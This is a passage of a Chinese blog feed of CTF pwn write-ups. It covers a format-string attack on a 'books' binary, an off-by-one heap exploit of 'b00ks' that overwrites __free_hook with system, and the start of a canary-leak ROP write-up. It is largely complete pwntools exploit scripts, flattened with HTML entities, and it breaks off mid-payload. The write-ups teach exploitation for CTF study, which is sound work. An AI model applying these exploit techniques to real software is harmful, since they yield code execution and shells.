&#x27;%2617c%13$hn.%31$p,%28$pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\nOrder 2: \\\\n&#x27;07:0038│ 0x7ffd361b0100 ◂— 0x3030303030303035 (&#x27;50000000&#x27;)08:0040│ 0x7ffd361b0108 —▸ 0x6011b8 —▸ 0x400830 ◂— cmp byte ptr [rip + 0x200c09], 009:0048│ 0x7ffd361b0110 ◂— 0xa /* &#x27;\\\\n&#x27; */0a:0050│ 0x7ffd361b0118 ◂— 0x0... ↓ 4 skipped0f:0078│ 0x7ffd361b0140 —▸ 0x7ff9bb7b0168 ◂— 0x010:0080│ 0x7ffd361b0148 ◂— 0x7ff900f0b5ff11:0088│ 0x7ffd361b0150 ◂— 0x112:0090│ 0x7ffd361b0158 —▸ 0x400cfd ◂— add rbx, 113:0098│ 0x7ffd361b0160 —▸ 0x7ffd361b018e ◂— 0x400cb02f3914:00a0│ 0x7ffd361b0168 ◂— 0x015:00a8│ 0x7ffd361b0170 —▸ 0x400cb0 ◂— push r1516:00b0│ 0x7ffd361b0178 —▸ 0x400780 ◂— xor ebp, ebp17:00b8│ 0x7ffd361b0180 —▸ 0x7ffd361b0270 ◂— 0x118:00c0│ 0x7ffd361b0188 ◂— 0x2f3966c3ad90a50019:00c8│ rbp 0x7ffd361b0190 —▸ 0x400cb0 ◂— push r151a:00d0│ 0x7ffd361b0198 —▸ 0x7ff9bb1df840 (__libc_start_main+240) ◂— mov edi, eax1b:00d8│ 0x7ffd361b01a0 ◂— 0x11c:00e0│ 0x7ffd361b01a8 —▸ 0x7ffd361b0278 —▸ 0x7ffd361b12b3 ◂— 0x736b6f6f622f2e /* &#x27;./books&#x27; */1d:00e8│ 0x7ffd361b01b0 ◂— 0x1bb7aeca0 rbp的低16字节处 也就是0x7ffd361b0180地址所存储的0x7ffd361b0270 这个值永远比ret_addr高0xd8(每个机子不一样) 不过在利用.fini_array之后 整个栈地址会有一个固定的偏移量 这个需要自行调试 调试后的payload如下 12345678910111213141516171819202122232425payload = &#x27;%&#x27; + str(0xa39) + &#x27;c%13$hn&#x27; + &#x27;.%31$p&#x27; + &#x27;,%28$p&#x27;payload = payload.ljust(0x74,&#x27;A&#x27;)payload += &#x27;\\\\x00&#x27; * (0x88 - len(payload))payload += p64(0x151)order1(payload)pause()submit(&#x27;0000000&#x27; + p64(fini_array))pause()sh.recvuntil(&#x27;\\\\x2e&#x27;)sh.recvuntil(&#x27;\\\\x2e&#x27;)sh.recvuntil(&#x27;\\\\x2e&#x27;)libc_start_main_addr = sh.recv(14)log.success(&#x27;libc_start_main_addr :&#x27; + libc_start_main_addr)sh.recvuntil(&#x27;\\\\x2c&#x27;)leak_addr = sh.recv(14)log.success(&#x27;leak_addr :&#x27; + leak_addr)leak_addr = int(leak_addr, 16)libc_start_main_addr = int(libc_start_main_addr, 16)ret_addr = leak_addr - 0xd8 - 0x110log.success(&#x27;ret_addr :&#x27; + str(ret_addr))libc_base = libc_start_main_addr - 0x20840 EXP知道了所需地址 用one_gadget再利用fmt改ret_addr即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./books&#x27;)sh = process(&#x27;./books&#x27;)libc = elf.libcfini_array = 0x6011b8main_addr = 0x400a39def order1(payload): sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Enter first order:&#x27;) sh.sendline(payload)def order2(payload): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Enter second order:&#x27;) sh.sendline(payload)def submit(content): sh.sendline(&#x27;5&#x27; + content)def del1(): sh.sendline(&#x27;3&#x27;)def del2(): sh.sendline(&#x27;4&#x27;)gdb.attach(sh)del2()payload = &#x27;%&#x27; + str(0xa39) + &#x27;c%13$hn&#x27; + &#x27;.%31$p&#x27; + &#x27;,%28$p&#x27;payload = payload.ljust(0x74,&#x27;A&#x27;)payload += &#x27;\\\\x00&#x27; * (0x88 - len(payload))payload += p64(0x151)order1(payload)pause()submit(&#x27;0000000&#x27; + p64(fini_array))pause()sh.recvuntil(&#x27;\\\\x2e&#x27;)sh.recvuntil(&#x27;\\\\x2e&#x27;)sh.recvuntil(&#x27;\\\\x2e&#x27;)libc_start_main_addr = sh.recv(14)log.success(&#x27;libc_start_main_addr :&#x27; + libc_start_main_addr)sh.recvuntil(&#x27;\\\\x2c&#x27;)leak_addr = sh.recv(14)log.success(&#x27;leak_addr :&#x27; + leak_addr)leak_addr = int(leak_addr, 16)libc_start_main_addr = int(libc_start_main_addr, 16)ret_addr = leak_addr - 0xd8 - 0x110log.success(&#x27;ret_addr :&#x27; + str(ret_addr))libc_base = libc_start_main_addr - 0x20840one_gadget = libc_base + 0x45226print &#x27;one_gadget = &#x27; + hex(one_gadget)one_gadget1 = &#x27;0x&#x27;+str(hex(one_gadget))[-2:]print one_gadget1one_gadget2 = &#x27;0x&#x27;+str(hex(one_gadget))[-7:-2]print one_gadget2one_gadget1 = int(one_gadget1,16)one_gadget2 = int(one_gadget2,16)del2()payload = &quot;%&quot; + str(one_gadget1) + &quot;d%13$hhn&quot;payload += &#x27;%&#x27; + str(one_gadget2 - one_gadget1) + &#x27;d%14$hn&#x27;payload = payload.ljust(0x74,&#x27;A&#x27;)payload += &#x27;\\\\x00&#x27; * (0x88 - len(payload))payload += p64(0x151)order1(payload)pause()submit(&#x27;0000000&#x27; + p64(ret_addr) + p64(ret_addr + 1))pause()sh.interactive() 只不过一次性改太多字节的话会报错 我这环境是先改了ret_addr的尾字节 然后再改了剩余的5个字节 对于one_gadget的话 对着libc-2.23.so用就行了","categories":[{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"}],"tags":[]},{"title":"(溢出伪造)b00ks","slug":"b00ks","date":"2023-11-01T03:00:55.000Z","updated":"2023-11-01T03:10:31.167Z","comments":true,"path":"2023/11/01/b00ks/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/b00ks/","excerpt":"入门off_by_one的好题 不过由于堆题逻辑都比较复杂 所以分析和wp的撰写就由exp的顺序进行了 正常的解题肯定不是这个分析顺序","text":"入门off_by_one的好题 不过由于堆题逻辑都比较复杂 所以分析和wp的撰写就由exp的顺序进行了 正常的解题肯定不是这个分析顺序 [溢出伪造]b00ks分析123456789101112131415161718192021222324252627282930signed __int64 change_sub_B6D()&#123; printf(&quot;Enter author name: &quot;); if ( !(unsigned int)my_read_sub_9F5(off_202018, 32) ) return 0LL; printf(&quot;fail to read author_name&quot;, 32LL); return 1LL;&#125;signed __int64 __fastcall my_read_sub_9F5(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 对于sub_9F5函数而言 作为一个自己写的read功能函数 存在了边界错误的情况 *a1是传入时malloc的内存 a2是固定长度32 然而如果是指定32个字节 那么循环中的i就应该从1起算 不然会导致buf++后最后会多一个字节 可以带入a2&#x3D;3验证一下buf[4]是不是等于0 所以此处有off_by_null的漏洞 123456 +---------+---------+---------+ book_control_heap | book_id |book_name|book_desc|(bss_base + 0x202040) +---------+---------+---------+ | | | | heap1 heap2 以上这些都是我自己命名的 直接干讲可能会有点不好理解 在这先将该程序的堆结构列出 而后在进行分别讲解 首先是id name和desc三个字段的存储 12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *((_DWORD *)v3 + 6) = size_v1; *((_QWORD *)off_202010 + v2) = v3; *((_QWORD *)v3 + 2) = desc_v5; *((_QWORD *)v3 + 1) = name_ptr; *(_DWORD *)v3 = ++unk_202024; return 0LL;&#125; 这是sub_F55函数 也就是create book功能对应函数中的代码 一个QWORD代表8字节 DWORD代表4字节 因此v3的初始8位存放着id(unk_202024初始为0) 再8位存放着name 再8位存放着desc 再8位存放着size 以上都从user_data区开始计算 1234567891011121314151617181920212223242526272829303132333435363738pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555757000Size: 0x411Allocated chunk | PREV_INUSE &lt;--- book1_name_heapAddr: 0x555555757410Size: 0x31Allocated chunk | PREV_INUSE &lt;--- book1_desc_heapAddr: 0x555555757440Size: 0x31Allocated chunk | PREV_INUSE &lt;--- book1_control_heap Addr: 0x555555757470Size: 0x31Top chunk | PREV_INUSEAddr: 0x5555557574a0Size: 0x20b61pwndbg&gt; x/20gx 0x5555557574700x555555757470: 0x0000000000000000 0x00000000000000310x555555757480: 0x0000000000000001 0x00005555557574200x555555757490: 0x0000555555757450 0x00000000000000200x5555557574a0: 0x0000000000000000 0x0000000000020b610x5555557574b0: 0x0000000000000000 0x00000000000000000x5555557574c0: 0x0000000000000000 0x00000000000000000x5555557574d0: 0x0000000000000000 0x00000000000000000x5555557574e0: 0x0000000000000000 0x00000000000000000x5555557574f0: 0x0000000000000000 0x00000000000000000x555555757500: 0x0000000000000000 0x0000000000000000book_control_heap ---&gt; 0x555555757440book_id ---&gt; 0x1book_name ---&gt; 0x555555757420book_desc ---&gt; 0x555555757450book_size ---&gt; 0x20 我们可以看到确实如此 结合我们刚刚的结构图就可以对他的大致流程有一个了解了 对于book_control_heap他的地址在命名之后也会存储在bss段上 123456789101112131415161718signed __int64 sub_B24()&#123; signed int i; // [rsp+0h] [rbp-4h] for ( i = 0; i &lt;= 19; ++i ) &#123; if ( !*((_QWORD *)off_202010 + i) ) return (unsigned int)i; &#125; return 0xFFFFFFFFLL;&#125;v2 = sub_B24();*((_QWORD *)off_202010 + v2) = v3;.data:0000000000202010 off_202010 dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38↑o.data:0000000000202010 ; del_sub_BBD:loc_C1B↑o ....data:0000000000202018 off_202018 dq offset unk_202040 ; DATA XREF: change_sub_B6D+15↑o 以上都是节选 全放下来太多了 v2经过B24函数之后 相当于初始化了 第一本书就是0第二本书就是1以此类推 然后注意我们的QWORD代表8字节 那么如果我们的第一本书的control_heap地址就该存放在unk_202060 1234567891011pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555556000 r-xp 2000 0 /home/apple/Desktop/b00ks 0x555555755000 0x555555756000 r--p 1000 1000 /home/apple/Desktop/b00ks 0x555555756000 0x555555757000 rw-p 1000 2000 /home/apple/Desktop/b00kspwndbg&gt; x/20gx 0x555555554000 + 0x2020400x555555756040: 0x6161616161616161 0x00000000000000000x555555756050: 0x0000000000000000 0x00000000000000000x555555756060: 0x0000555555757480 0x0000000000000000 (book1_control_heap) bss段的起始地址我们是能够看到的 为啥取0x202040是因为这是author_name的存储地址 在这就能够看到author_name与book1_control_heap地址相差的正好是0x20 如果我们的author_name输入长度为32(所给最大长度) 那么由于边界错误 buf的第33个字节为x00就能覆盖control_heap的最后一个字节 进而更改在这存储的book1_control_heap地址 达到欺骗计算机目的 进而引导到我们所构造的fake_heap中 泄漏地址123456789101112131415161718192021222324252627282930from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;sh = process(&#x27;./b00ks&#x27;)def add(size1,name,size2,desc): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Enter book name size:&#x27;) sh.sendline(str(size1)) sh.recvuntil(&#x27;Enter book name (Max 32 chars):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Enter book description size:&#x27;) sh.sendline(str(size2)) sh.recvuntil(&#x27;Enter book description:&#x27;) sh.sendline(desc)def show(): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;4&#x27;)gdb.attach(sh)sh.recvuntil(&#x27;Enter author name:&#x27;)sh.sendline(&#x27;a&#x27; * 32)add(0x90, &#x27;aaaa&#x27;, 0x90, &#x27;bbbb&#x27;)show()sh.recvuntil(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)book1_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;)) 因为printf的特性 在读取到x00之前都不会停止输出 我们如果将author_name的0x20塞满 那么printf就会输出book1_control_heap的地址了 至于为什么要申请0x90大小后面会说 有细心的读者也会发现create时没有对输入的size大小进行限制 1234567891011121314def add(size1,name,size2,desc): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Enter book name size:&#x27;) sh.sendline(str(size1)) sh.recvuntil(&#x27;Enter book name (Max 32 chars):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Enter book description size:&#x27;) sh.sendline(str(size2)) sh.recvuntil(&#x27;Enter book description:&#x27;) sh.sendline(desc)add(0x21000, &#x27;cccc&#x27;, 0x21000, &#x27;dddd&#x27;)book2_addr = book1_addr + 0x30 在我们申请一个超过128KB的堆空间时 我们的book2_name和book2_desc确实是存储在mmap申请的很高的堆地址空间中 但是我们的book2_control_heap地址是在book1_control_heap的高0x30处 因为这个control_heap是程序已经定死的 具体可以看sub_F55函数部分 12345678910111213141516171819202122232425262728293031323334#After add(0x21000, &#x27;cccc&#x27;, 0x21000, &#x27;dddd&#x27;)pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55e1603a8000Size: 0x1011Allocated chunk | PREV_INUSEAddr: 0x55e1603a9010Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55e1603a90b0Size: 0xa1Allocated chunk | PREV_INUSE &lt;--- book1_control_heapAddr: 0x55e1603a9150Size: 0x31Allocated chunk | PREV_INUSE &lt;--- book2_control_heapAddr: 0x55e1603a9180Size: 0x31Top chunk | PREV_INUSEAddr: 0x55e1603a91b0Size: 0x20e51pwndbg&gt; x/20gx 0x55e1603a91800x55e1603a9180: 0x0000000000000000 0x00000000000000310x55e1603a9190: 0x0000000000000002 0x00007fb66514a0100x55e1603a91a0: 0x00007fb665128010 0x00000000000210000x55e1603a91b0: 0x0000000000000000 0x0000000000020e510x55e1603a91c0: 0x0000000000000000 0x00000000000000000x55e1603a91d0: 0x0000000000000000 0x0000000000000000 至此 book2_control_heap的地址获得了 book1的+0x30即可 伪造HEAP程序输入的逻辑是这样的 12341. bss + 0x202040:author_name2. bss + 0x202060:book1_control_heap3. bss + 0x202060 + 0x8:book2_control_heap... 所以第一次输入的author_name其实覆盖不了book1_control_heap 先后顺序的原因 所以得create book1之后再进行一次输入 才能覆盖 代码我就不贴了 注意我重新调试了一下 不要纠结于上面的那些地址 1234567891011121314151617181920212223242526272829pwndbg&gt; x/20gx 0x55f743a7e000 + 0x2020400x55f743c80040: 0x6161616161616161 0x61616161616161610x55f743c80050: 0x6161616161616161 0x61616161616161610x55f743c80060: 0x000055f7450e8100 0x000055f7450e8190pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55f7450e7000Size: 0x1011Allocated chunk | PREV_INUSEAddr: 0x55f7450e8010Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55f7450e80b0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55f7450e8150Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x55f7450e8180Size: 0x31Top chunk | PREV_INUSEAddr: 0x55f7450e81b0Size: 0x20e51 我们将book1_control_heap的地址覆盖成了0x55f7450e8100 也就是说我们要在这个地址上伪造一个堆 对于我们伪造的这个堆而言 他的地址处于book1_desc与book1_control_heap之间 那么为了我们堆空间利用难度而言 我们伪造的这个堆地址需要尽可能靠近book1_desc 也要尽可能远离book1_control_heap 这需要以下两点 1234567891011121314151617181.book1_desc的堆空间要适度2.book1_name的堆空间大小要多次调试 防止book1_desc的堆起始地址过高#exppayload = &#x27;a&#x27; * 0x40 + p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x1000)edit(1,payload)#伪造后的情况如下pwndbg&gt; x/20gx 0x55f7450e80b00x55f7450e80b0: 0x0000000000000000 0x00000000000000a10x55f7450e80c0: 0x6161616161616161 0x61616161616161610x55f7450e80d0: 0x6161616161616161 0x61616161616161610x55f7450e80e0: 0x6161616161616161 0x61616161616161610x55f7450e80f0: 0x6161616161616161 0x61616161616161610x55f7450e8100: 0x0000000000000001 0x000055f7450e81980x55f7450e8110: 0x000055f7450e8198 0x00000000000010000x55f7450e8120: 0x0000000000000000 0x0000000000000000 我们肯定只能从book1_desc入手修改 程序正好提供了修改的函数 不然得覆盖好多数据 我们伪造的是book1 所以id是1 至于name和desc无所谓都用book2的name即可 反正只需要打印出其中一个地址就行 用自带的show打印出其中一个地址 与libc相减做差后就可以得到libc基地址 不过这个基地址每个人不一样 12345678910payload = &#x27;a&#x27; * 0x40 + p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x1000)edit(1,payload)change_name()show()#pause()sh.recvuntil(&#x27;Name: &#x27;)book2_name_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))print hex(book2_name_addr)libc_base = book2_name_addr - 0x5b1010 FREE_HOOKfree_hook的作用就是在malloc或者free他时 会去调用这个指针所指向的东西 好好使用功能是很强大的 但是如果存了system 危害也是极大的 12345678if ( i != 20 ) &#123; free(*(void **)(*((_QWORD *)off_202010 + i) + 8LL)); free(*(void **)(*((_QWORD *)off_202010 + i) + 16LL)); free(*((void **)off_202010 + i)); *((_QWORD *)off_202010 + i) = 0LL; return 0LL; &#125; 对于此题而言唯一可控的free在del book处 逐个free掉book_name和book_desc 不过由于我们执行的system需要参数 所以free_hook写在book_desc上 12edit(1, p64(binsh) + p64(free_hook))edit(2, p64(system_addr)) 要执行system的话 我们需要往free_hook所指向的地址写入system 回顾一下我们写入的free_hook地址 在我们伪造的book1_desc处 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x55c269fb6000Size: 0x1011Allocated chunk | PREV_INUSEAddr: 0x55c269fb7010Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55c269fb70b0Size: 0xa1Allocated chunk | PREV_INUSEAddr: 0x55c269fb7150Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x55c269fb7180Size: 0x31Top chunk | PREV_INUSEAddr: 0x55c269fb71b0Size: 0x20e51pwndbg&gt; x/20gx 0x55c269fb70b00x55c269fb70b0: 0x0000000000000000 0x00000000000000a1. real_book_control_heap0x55c269fb70c0: 0x6161616161616161 0x61616161616161610x55c269fb70d0: 0x6161616161616161 0x61616161616161610x55c269fb70e0: 0x6161616161616161 0x61616161616161610x55c269fb70f0: 0x6161616161616161 0x61616161616161610x55c269fb7100: 0x0000000000000001 0x000055c269fb7198 fake_book1_conrol_heap0x55c269fb7110: 0x000055c269fb7198 0x00000000000010000x55c269fb7120: 0x0000000000000000 0x00000000000000000x55c269fb7130: 0x0000000000000000 0x00000000000000000x55c269fb7140: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/20gx 0x55c269fb71800x55c269fb7180: 0x0000000000000000 0x00000000000000310x55c269fb7190: 0x0000000000000002 0x00007ff5d5007e57 book2_control_heap0x55c269fb71a0: 0x00007ff5d52417a8 0x00000000000210000x55c269fb71b0: 0x0000000000000000 0x0000000000020e510x55c269fb71c0: 0x0000000000000000 0x00000000000000000x55c269fb71d0: 0x0000000000000000 0x00000000000000000x55c269fb71e0: 0x0000000000000000 0x00000000000000000x55c269fb71f0: 0x0000000000000000 0x00000000000000000x55c269fb7200: 0x0000000000000000 0x00000000000000000x55c269fb7210: 0x0000000000000000 0x0000000000000000 肯定有人有疑问为啥还要兜一圈用伪造的book1_control_heap写入book2_name和book2_desc数据呢 不是可以直接edit(2)吗 这是因为如果直接edit(2) 那么我们写入的地址是用mmap生成的一个很高的地址 这个地址我们是无法泄漏的 顶天写入free_hook 无法下一步操作 但是如果我们用fake_book_name和desc进行写入的话 我们写入的是上图中的0x55c269fb7198 而这个地址我们就算不调试也是已知的 允许二次写入 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;sh = process(&#x27;./b00ks&#x27;)elf = ELF(&#x27;./b00ks&#x27;)libc = elf.libcdef change_name(): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;5&#x27;) sh.recvuntil(&#x27;:&#x27;) sh.sendline(&#x27;a&#x27; * 32)def add(size1,name,size2,desc): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Enter book name size:&#x27;) sh.sendline(str(size1)) sh.recvuntil(&#x27;Enter book name (Max 32 chars):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Enter book description size:&#x27;) sh.sendline(str(size2)) sh.recvuntil(&#x27;Enter book description:&#x27;) sh.sendline(desc)def edit(id,payload): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;3&#x27;) sh.recvuntil(&#x27;Enter the book id you want to edit:&#x27;) sh.sendline(str(id)) sh.recvuntil(&#x27;Enter new book description:&#x27;) sh.sendline(payload)def show(): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;4&#x27;)def free(index): sh.sendlineafter(&#x27;&gt; &#x27;, &#x27;2&#x27;) sh.sendlineafter(&#x27;: &#x27;, str(index))#gdb.attach(sh)sh.recvuntil(&#x27;Enter author name:&#x27;)sh.sendline(&#x27;a&#x27; * 32)add(0x90, &#x27;aaaa&#x27;, 0x90, &#x27;bbbb&#x27;)show()sh.recvuntil(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;)book1_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))book2_addr = book1_addr + 0x30eprint (&#x27;book1_addr = &#x27;, hex(book1_addr))add(0x21000, &#x27;cccc&#x27;, 0x21000, &#x27;dddd&#x27;)#pause()payload = &#x27;a&#x27; * 0x40 + p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x1000)edit(1,payload)change_name()show()#pause()sh.recvuntil(&#x27;Name: &#x27;)book2_name_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))print hex(book2_name_addr)libc_base = book2_name_addr - 0x5b1010free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()edit(1, p64(binsh) + p64(free_hook))edit(2, p64(system_addr))#pause()free(2)#pause()sh.interactive() 最后将book2给free了即可 因为我们是写到book2上的 不过这个exp对环境要求比较高 远程没通 Unsorted bin原理其实很简单 当一个比较大(自己调试)的chunk被free之后 他会进入unsorted bin中 而这个unsorted bin中的的fd或者bk指针与libc的基址差值也是个固定值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]sh = process(&#x27;./b00ks&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;,27783)libc = ELF(&#x27;/home/apple/Desktop/buulibc/libc-2.23.buu.so&#x27;)elf = ELF(&#x27;./b00ks&#x27;)#libc1 = elf.libcdef create(name_size, name, desc_size, desc): sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Enter book name size:&#x27;) sh.sendline(str(name_size)) sh.recvuntil(&#x27;Enter book name (Max 32 chars)&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Enter book description size:&#x27;) sh.sendline(str(desc_size)) sh.recvuntil(&#x27;Enter book description:&#x27;) sh.sendline(desc)def change(): sh.sendline(&#x27;5&#x27;) sh.recvuntil(&#x27;Enter author name:&#x27;) sh.sendline(&#x27;a&#x27; * 0x20)def show(): sh.sendline(&#x27;4&#x27;)def free(id): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Enter the book id you want to delete:&#x27;) sh.sendline(str(id))def edit(id,payload): sh.recvuntil(&#x27;&gt;&#x27;) sh.sendline(&#x27;3&#x27;) sh.recvuntil(&#x27;Enter the book id you want to edit:&#x27;) sh.sendline(str(id)) sh.recvuntil(&#x27;Enter new book description:&#x27;) sh.sendline(payload)gdb.attach(sh)sh.recvuntil(&#x27;Enter author name:&#x27;)sh.sendline(&#x27;a&#x27; * 0x20)sh.recvuntil(&#x27;&gt;&#x27;)create(0x80, &#x27;aaaaaaaa&#x27;, 0x80, &#x27;bbbbbbbb&#x27;)sh.recvuntil(&#x27;&gt;&#x27;)show()sh.recvuntil(&#x27;a&#x27; * 0x20)book1_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))print(&#x27;book1_addr = &#x27;, hex(book1_addr))sh.recvuntil(&#x27;&gt;&#x27;)create(0x80, &#x27;aaaa&#x27;, 0x80, &#x27;bbbb&#x27;)sh.recvuntil(&#x27;&gt;&#x27;)create(0x20, &#x27;/bin/sh\\\\x00&#x27;, 0x20, &#x27;bbbb&#x27;)unsorted_bin_addr = book1_addr + 0x30#pause()payload = &#x27;a&#x27; * 0x50 + p64(1) + p64(unsorted_bin_addr + 0x8) + p64(book1_addr + 0x1d0 + 0x20) + p64(0x20)edit(1, payload)sh.recvuntil(&#x27;&gt;&#x27;)change()free(2)sh.recvuntil(&#x27;&gt;&#x27;)show()#pause()sh.recvuntil(&#x27;Name: &#x27;)libc_base = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;)) - 0x3c4b78print(&#x27;libc_base = &#x27;, hex(libc_base))free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print (&#x27;system_addr = &#x27;, hex(system_addr))#binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()#pause()#payload = p64(binsh_addr) + p64(free_hook)edit(1, p64(free_hook) + p64(0x10))#pause()edit(3, p64(system_addr))#pause()sleep(15)free(3)sh.interactive() 所以大体还是那样 只不过有两个比较玄学的问题 第一是关于binsh字段的 之前修改时payload是binsh + free_hook 可是这样的payload在这个exp中打不通 这样子的free_hook写不进system 于是转变了一下思路 在一开始就在name字段写进binsh 然后就是那个sleep 不sleep(15)的话没办法free","categories":[{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"}],"tags":[]},{"title":"(canary)bjdctf_2020_babyrop2","slug":"bjdctf-2020-babyrop2","date":"2023-11-01T02:25:54.000Z","updated":"2023-11-01T02:29:14.995Z","comments":true,"path":"2023/11/01/bjdctf-2020-babyrop2/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/bjdctf-2020-babyrop2/","excerpt":"bjdctf的题目虽然比较简单 但是对知识点的考察还是很明确的","text":"bjdctf的题目虽然比较简单 但是对知识点的考察还是很明确的 [canary]bjdctf_2020_babyrop212345678910111213unsigned __int64 gift()&#123; char format[8]; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;I&#x27;ll give u some gift to help u!&quot;); __isoc99_scanf(&quot;%6s&quot;, format); printf(format); puts(byte_400A05); fflush(0LL); return __readfsqword(0x28u) ^ v2;&#125; 一开始看到这个的时候 我还以为能够通过fmt漏洞直接泄漏got表的数据 后来发现我太年轻了 123456pwndbg&gt; stack 2500:0000│ rsp 0x7ffd67bdcac8 —▸ 0x40085c (gift+72) ◂— mov edi, 0x400a0501:0008│ rdi 0x7ffd67bdcad0 ◂— 0x407024372540 /* &#x27;@%7$p@&#x27; */02:0010│ 0x7ffd67bdcad8 ◂— 0x7496a7657299870003:0018│ rbp 0x7ffd67bdcae0 —▸ 0x7ffd67bdcb00 —▸ 0x400930 (__libc_csu_init) ◂— push r1504:0020│ 0x7ffd67bdcae8 —▸ 0x400905 (main+43) ◂— mov eax, 0 我输入的payload是‘@%7$p@’ + p64(puts_got) 那么%7$p倒是看清楚了 就是got表不见踪影了 最开始以为是环境的问题 换七换八的 最后发现他开了canary 123456[*] &#x27;/home/apple/Desktop/bjdctf_2020_babyrop2&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) canary的位置固定是rbp - 0x8 这个位置刚好是我们输入的got表位置 那么我们只能输出canary的值 然后进行基本的Libc泄漏了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./bjdctf_2020_babyrop2&#x27;)sh = remote(&#x27;node4.buuoj.cn&#x27;,27349)elf = ELF(&#x27;./bjdctf_2020_babyrop2&#x27;)pop_rdi = 0x400993pop_rsi_r15 = 0x400991vuln = 0x400887puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]#gdb.attach(sh)payload = &#x27;%7$p&#x27;sh.recvuntil(&quot;I&#x27;ll give u some gift to help u!&quot;)#pause()sh.sendline(payload)#pause()sh.recvuntil(&#x27;0x&#x27;)canary = int(sh.recv(16),16)print canarypayload = &#x27;a&#x27; * (0x20 - 0x8)payload += p64(canary)payload += &#x27;a&#x27; * 0x8payload += p64(pop_rdi) + p64(puts_got) + 